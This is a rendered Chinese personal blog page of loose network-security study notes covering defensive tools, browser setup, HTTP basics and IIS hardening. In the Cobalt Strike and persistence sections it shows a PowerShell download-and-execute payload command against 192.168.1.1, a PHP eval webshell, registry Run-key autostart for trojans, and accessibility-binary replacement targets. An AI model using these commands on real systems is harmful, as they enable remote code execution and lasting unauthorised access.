@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>待整理笔记 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,工具," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>待整理笔记</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-02-12
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="0筆記"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>网络安全(一)待整理笔记</p>
+<h3 id="数据包分析工具"><a href="#数据包分析工具" class="headerlink" title="数据包分析工具"></a>数据包分析工具</h3><p><a target="_blank" rel="noopener" href="https://www.wireshark.org/">wireshark</a><br><a target="_blank" rel="noopener" href="http://www.tcpdump.org/">tcpdump</a></p>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p><a target="_blank" rel="noopener" href="https://modsecurity.org/">ModSecurity</a><br><a href="https://github.com/nbs-system/naxsi">Naxsi</a></p>
+<h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><p><a target="_blank" rel="noopener" href="https://www.snort.org/">snort</a><br><a target="_blank" rel="noopener" href="https://suricata-ids.org/">suricata</a><br><a target="_blank" rel="noopener" href="https://www.bro.org/">bro</a><br><a target="_blank" rel="noopener" href="https://ossec.github.io/">ossec</a><br><a target="_blank" rel="noopener" href="https://www.alienvault.com/products/ossim">ossim</a></p>
+<h3 id="111111111111"><a href="#111111111111" class="headerlink" title="111111111111"></a>111111111111</h3><p>內核<br>驅動、文件系統、網絡、進程、內存</p>
+<p>v2ray –config=/usr/local/etc/v2ray/config.json</p>
+<p>ASCII 码表：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fr=aladdin</a></p>
+<h3 id="安装中文版本-Firefox-浏览器"><a href="#安装中文版本-Firefox-浏览器" class="headerlink" title="安装中文版本 Firefox 浏览器"></a>安装中文版本 Firefox 浏览器</h3><p>卸载旧版本浏览器</p>
+<p>rm -rf /usr/lib/firefox-esr<br>rm -rf /usr/lib/firefox-bin<br>rm -rf /usr/lib/firefox<br>rm -rf /usr/bin/firefox<br>rm /usr/share/applications/firefox-esr.desktop</p>
+<p><a target="_blank" rel="noopener" href="https://www.mozilla.org/zh-CN/firefox/new/">https://www.mozilla.org/zh-CN/firefox/new/</a></p>
+<p>wget <a target="_blank" rel="noopener" href="https://download-installer.cdn.mozilla.net/pub/firefox/releases/91.0.2/linux-x86_64/zh-CN/firefox-91.0.2.tar.bz2">https://download-installer.cdn.mozilla.net/pub/firefox/releases/91.0.2/linux-x86_64/zh-CN/firefox-91.0.2.tar.bz2</a></p>
+<p>tar -jxvf firefox-91.0.2.tar.bz2 -C /usr/lib/</p>
+<p>创建软链接<br>ln -s /usr/lib/firefox/firefox /usr/bin/firefox</p>
+<p>创建快捷啟動方式</p>
+<p>vim /usr/share/applications/firefox.desktop</p>
+<p>[Desktop Entry]<br>Version=666<br>Name=firefox<br>Name[zh_CN]=firefox-浏览器<br>Exec=firefox<br>Terminal=false<br>Type=Application<br>Icon=firefox</p>
+<p>hackbar 简介：Hackbar 是一个 Firefox 的插件,它的功能类似于地址栏,但是它里面的数据不受服务<br>器的相应触发的重定向等其它变化的影响。这个 Hackbar 可以幫助测试 SQL 注入,XSS 漏洞和网站的<br>安全性,主要幫助开发人员做代码的安全审计,检查代码,寻找安全漏洞</p>
+<p>注：hackbar 插件下载地址<br>下载地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></p>
+<p>git clone <a href="https://github.com/HCTYMFF/hackbar2.1.3.git">https://github.com/HCTYMFF/hackbar2.1.3.git</a></p>
+<p>打開瀏覽器 -》 添加組件 -》 手動選擇插件</p>
+<h3 id="刷新dns缓存"><a href="#刷新dns缓存" class="headerlink" title="刷新dns缓存"></a>刷新dns缓存</h3><p>ipconfig flushdns</p>
+<h3 id="安裝-google-chrome"><a href="#安裝-google-chrome" class="headerlink" title="安裝 google chrome"></a>安裝 google chrome</h3><p>wget <a target="_blank" rel="noopener" href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb">https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</a></p>
+<p>dpkg -i google-chrome-stable_current_amd64.deb ; apt -f install</p>
+<p>关闭XSS防护<br>vim /opt/google/chrome/google-chrome<br>最后一行 拼接加入 –user-data-dir –nosandbox</p>
+<p>windows</p>
+<ol>
+<li><p>右击桌面图标，选择属性，复制目标中的内容 “C:\Program Files (x86)\Google\Chrome\Application\chrome.exe”</p>
+</li>
+<li><p>右击 =&gt; 新建 =&gt; 快捷方式，在 “请键入对象的位置” 输入以下内容 新建快捷方式 “C:\Program Files (x86)\Google\Chrome\Application\chrome.exe” –args –disable-xss-auditor</p>
+</li>
+<li><p>创建新的名称</p>
+</li>
+</ol>
+<h3 id="cobalt-strike"><a href="#cobalt-strike" class="headerlink" title="cobalt strike"></a>cobalt strike</h3><p>apt攻击 高级可持续威胁攻击，也叫定向威胁攻击，针对某一个目标，可持续长期的攻击，具有极强的隐蔽性，针对性，通常会运用各种介质、供应链，社会工程学等<br>cobalt strike 基于cs架构的商业渗透软件，适合多人团队协作，可模拟apt做模拟对抗，进行内网渗透，gui框架式的，集成端口转发、服务扫描、自动化溢出、win exe木马、木马生成、钓鱼攻击、站点clone、目标信息获取等</p>
+<p>客户端：本机<br>服务端：连接的服务器、生成payload、监听器、下载攻击代码、保存日志记录<br>目标：受害者 </p>
+<p>开启服务端<br>./teamserver 192.168.1.1 123456<br>teamserver.bat 192.168.1.1 123456<br>主机  端口  用户  密码123546</p>
+<p>启动客户端<br>./cobaltstrike  或者  cobaltstrike.bat</p>
+<p>流程</p>
+<ol>
+<li>设置监听器 常用53、80、6666、8080端口，会有传输器用于主机ip</li>
+<li>生成payload powershell.exe -nop -w hidden -c “IEX((new-objectnet.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.1.1/a&#39;))&quot;">http://192.168.1.1:80/a&#39;))&quot;</a></li>
+<li>目标机器运行</li>
+</ol>
+<p>自解压启动<br>压缩=》勾选创建自解压缩格式压缩文件=》高级=》自解压选项=》路径=》模式-全部隐藏=》</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>木马删除之后，shell就会丢失权限；权限维持让木马一直存在，自动生成木马，留下后门；</p>
+<ol>
+<li>Windows注册表</li>
+</ol>
+<p>系统参数、应用程序、硬件驱动等参数，系统各种配置的文件；win系统在开机时，会自动加载</p>
+<p>HKLM=HKEY_LOCAL_MACHINE  机器软硬件信息<br>HKCU=HEKY_CURRENT_USER 当前用户的配置信息<br>HKCR=HKEY_CLASSES_ROOT 文件关联相关信息<br>HKU=HKEY_USERS 所有用户信息<br>HKCC=HKEY_CURRENT_CONFIG 当前系统配置</p>
+<p>图形化设置  命令行设置</p>
+<p>系统中安装的软件<br>REG query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall<br>REG query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</p>
+<p>查询远程服务端口<br>REG query “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber </p>
+<p>开启远程服务<br>REG ADD “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnetcions /t REG_DWORD /d 0 /f </p>
+<p>利用注册表加入开机自启动程序，木马、webshell等<br>打开记事本<br>REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “test” /t REG_SZ /d “C:\Windows\System32\notepad.exe” /f</p>
+<p>保存成一个bat文件 1.bat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval($_REQUEST[&#39;abc&#39;];?&gt;&quot; C:\www\a.php </span><br></pre></td></tr></table></figure>
+
+<p>然后到命令行执行<br>REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v “test” /t REG_SZ /d “C:\www\1.bat” /f</p>
+<ol start="2">
+<li>辅助功能软件</li>
+</ol>
+<p>辅助功能：可以快捷启动</p>
+<p>原理：一些快捷启动的程序，路径时固定的，可以进行替换来达到启动</p>
+<p>屏幕键盘       C:\Windows\System32\osk.exe<br>放大镜         C:\Windows\System32\Magnify.exe<br>旁白           C:\Windows\System32\Narrator.exe<br>显示开关       C:\Windows\System32\DisplaySwith.exe<br>应用程序开关    C:\Windows\System32\AtBroker.exe<br>粘滞键         C:\Windows\System32\sethc.exe<br>辅助功能        C:\Windows\System32\utilman.exe</p>
+<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat "></a>netstat </h3><p>netstat -n按Enter键，即可插看服务器活动的TCP/IP链接<br>输入netstat -r 命令，即可查看本机的路由器信息<br>输入netstat -a命令，可查看本机所有活动的TCP链接<br>输入netstat -n -a可查看本机所有链接端口即现状<br>netstat -na | wc -l  单台运用服务器请求数</p>
+<h3 id="tracert-traceroute"><a href="#tracert-traceroute" class="headerlink" title="tracert  traceroute "></a>tracert  traceroute </h3><p>Tracert(跟踪路由)是路由跟踪实用程序，用于确定 IP数据包访问目标所采取的路径</p>
+<h3 id="IIS-服务器应该做哪些方面的保护措施："><a href="#IIS-服务器应该做哪些方面的保护措施：" class="headerlink" title="IIS 服务器应该做哪些方面的保护措施："></a>IIS 服务器应该做哪些方面的保护措施：</h3><p>整理来源：<a target="_blank" rel="noopener" href="http://www.williamlong.info/archives/118.html">http://www.williamlong.info/archives/118.html</a></p>
+<ol>
+<li>保持 Windows 升级:</li>
+<li>使用 IIS 防范工具</li>
+<li>移除缺省的 Web 站点</li>
+<li>如果你并不需要 FTP 和 SMTP 服务，请卸载它们</li>
+<li>有规则地检查你的管理员组和服务:</li>
+<li>严格控制服务器的写访问权限</li>
+<li>设置复杂的密码</li>
+<li>减少/排除 Web 服务器上的共享</li>
+<li>禁用 TCP/IP 协议中的 NetBIOS:</li>
+<li>使用 TCP 端口阻塞</li>
+<li>仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat</li>
+<li>管理 IIS 目录安全:</li>
+<li>使用 NTFS 安全:</li>
+<li>管理用户账户</li>
+<li>审计你的 Web 服务器</li>
+</ol>
+<h4 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h4><ol>
+<li>HTTP (超文本传输协议)</li>
+<li>HTTP设计用来将超文本标记语言(HTML)文档从Web服务器传送到Web浏览器</li>
+<li>HTTP是一个请求和回应协议:客户机发送请求，服务器对请求给出回应</li>
+<li>HTTP使用可靠的TCP连接,默认TCP端口是80。HTTPS承载于TLS或SSL协议层之上，默认端口为443</li>
+</ol>
+<p>HTTP非持久连接</p>
+<ol>
+<li>浏览器首先初始化与运行http服务器主机的TCP连接，使用URL指定端口</li>
+<li>浏览器通过与TCP连接相关联的本地套接字发出一个HTTP请求消息</li>
+<li>服务器接收到请求之后，解析请求并处理请求，然后通过- -个套接字发出相应消息</li>
+<li>服务器通知TCP需要关闭连接(在浏览器收到相应消息之后才会真正终止连接)</li>
+<li>浏览器收到响应消息，TCP连接终止</li>
+</ol>
+<p>HTTP持久连接<br>持久连接没有关闭连接这一步，服务器响应后会继续让TCP连接保持打开状态</p>
+<p>HTTP特点</p>
+<ol>
+<li>支持客户/服务器模式</li>
+<li>简单快速，客户向服务器请求服务时，只需传送请求方法和路径</li>
+<li>灵活，HTTP允许传输任意类型的数据对象。正在传输的类型由Content- Type加以标记</li>
+<li>无连接，每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断并连接。</li>
+<li>HTTP协议是无状态协议，无状态是指协议对于事务处理没有记忆能力</li>
+</ol>
+<p>HTTP报文</p>
+<ol>
+<li>HTTP的一个会话，由Request和response组成</li>
+<li>HTTP请求(Requests) 由请求行、消息报头、请求正文三个部分组成<br> 请求行:方法，URL,协议/版本(Method-URl-Protocol/Version)<br> 消息报头/请求头(Request headers)<br> 请求正文(Entity body)</li>
+<li>HTTP响应(Responses)也包含三个部分:状态行、消息报头、响应正文<br> 状态行:协议状态代码描叙(Protocol Status code-Description)<br> 消息报头(Response headers)<br> 响应正文(Entity body)</li>
+</ol>
+<p>设置代理</p>
+<ol>
+<li>根据协议的学习我们了解HTTP协议分为两个部分:请求和回应。</li>
+<li>平时浏览网页，请求报文是经过浏览器包装好的，不通过工具直接访问只能够控制很少的部分。</li>
+<li>要想真正的人为控制与服务器交互，只能通过代理抓包的方法。</li>
+<li>代理:作为客户端和服务器的中间者，在利用http协议交互时，所有请求和回应都不会直接发送给目标而是由代理接受和转发</li>
+</ol>
+<p>HTTP请求首部</p>
+<ol>
+<li>Host:主要用于指定被请求支援的Internet主机和端口号</li>
+<li>User-Agent:向服务端传递客户端操作系统、 浏览器、和其他属性</li>
+<li>Referer;包含一个URL，代表当前URL的上一个URL</li>
+<li>Cookie:是一段文本，通常来表示请求者的身份</li>
+<li>Range:Range可以请求实体部分内容，多线程下载一定会用到此请求头</li>
+<li>x-forward-for:即XFF头, 代表请求端的IP，也可以是多个，中间用逗号隔开</li>
+<li>Accept:用于指定客户端接收哪些MIME类型的信息</li>
+<li>Accept-Charset:用于指定客户端接收的字符集   </li>
+<li>Content-Type:用于向接收方指示实体的介质类型</li>
+<li>Content-Encbding:被用作媒体类型的修饰符,表示了已经被用到实体正文的附加内容编码,想要获得content-type报头域中所弓|用的媒体类型，必须采用相应的解码机制</li>
+<li>Content-Length:用于指明实体正文的长度，以字节方式存储的十进制数字来表示</li>
+<li>Last-Modified:用于指示资源的最好修改时间和日期 </li>
+</ol>
+<p>HTTP请求方式</p>
+<p>HTTP响应状态码<br>200 请求成功<br>302 重定向<br>400 客户端有语法错误，不能被服务器解析<br>401 请求未授权<br>403 服务器收到请求，但是拒绝提供服务<br>404 请求的资源不存在<br>500 服务器内部错误<br>503 服务器当前不能处理客户端请求，过段时间恢复正常</p>
+<h4 id="什么是URL"><a href="#什么是URL" class="headerlink" title="什么是URL"></a>什么是URL</h4><p>URL是统一资源定位符，对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。</p>
+<p>互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p>
+<p>基本URL包含模式（或称协议）、服务器名称（或IP地址）、路径和文件名，<br>如<code>协议：//授权/路径?查询</code></p>
+<p>完整的、带有授权部分的普通统一资源标志符语法看上去如下：<br><code>协议：//用户名:密码@子域名.域名.顶级域名:端口号/目录/文件名.文件后缀?参数=值#标志</code></p>
+<h3 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h3><p>require_once(‘waf.php’);</p>
+<p>整站,可选择数据库配置页</p>
+<p>常用php系统添加文件<br>PHPCMS V9 \phpcms\base.php<br>PHPWIND8.7 \data\sql_config.php<br>DEDECMS5.7 \data\common.inc.php<br>DiscuzX2 \config\config_global.php<br>Wordpress \wp-config.php<br>Metinfo \include\head.php</p>
+<p>Automatically add files before or after any PHP document.<br>auto_prepend_file = safe.php路径;</p>
+<p>文件监控</p>
+<p>tcpdump -s 0 -w flow.pcap port 9999</p>
+
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/0%E7%AD%86%E8%A8%98/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/%E5%B7%A5%E5%85%B7/">
+              #工具
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/%E7%A7%92%E8%BD%AC%E6%88%90%E6%97%B6%E9%97%B4/" target="_self">将给出的秒转成时间格式</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/How%20Do%20You%20Do/" target="_self">How Do You Do - Befour</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2015, 0, 1).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
